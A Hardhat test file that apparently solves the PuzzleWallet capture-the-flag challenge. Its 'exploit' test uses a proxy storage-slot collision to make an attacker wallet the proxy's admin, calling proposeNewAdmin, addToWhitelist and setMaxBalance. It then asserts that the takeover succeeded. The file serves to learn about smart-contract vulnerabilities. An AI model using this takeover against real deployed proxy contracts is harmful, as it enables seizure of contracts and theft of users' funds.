const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "PuzzleWallet";

describe.only(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const PuzzleWalletFactory = await ethers.getContractFactory("PuzzleWallet");
        const puzzleWalletContract = await PuzzleWalletFactory.deploy();

        const PuzzleProxyFactory = await ethers.getContractFactory("PuzzleProxy");
        const puzzleProxyContract = await PuzzleProxyFactory.deploy(owner.address, puzzleWalletContract.address, []);

        return { owner, puzzleProxyContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, puzzleProxyContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, puzzleProxyContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            await puzzleProxyContract.connect(attackerWallet).proposeNewAdmin(attackerWallet.address);

            let puzzleWalletContract = await ethers.getContractAt(
                "PuzzleWallet",
                puzzleProxyContract.address,
                owner,
            );
            await puzzleWalletContract.connect(attackerWallet).addToWhitelist(attackerWallet.address);
            await puzzleWalletContract.connect(attackerWallet).setMaxBalance(attackerWallet.address);
        });

        after(async function () {
            expect(await puzzleProxyContract.admin.call()).to.be.equal(attackerWallet.address);
        });
    });
});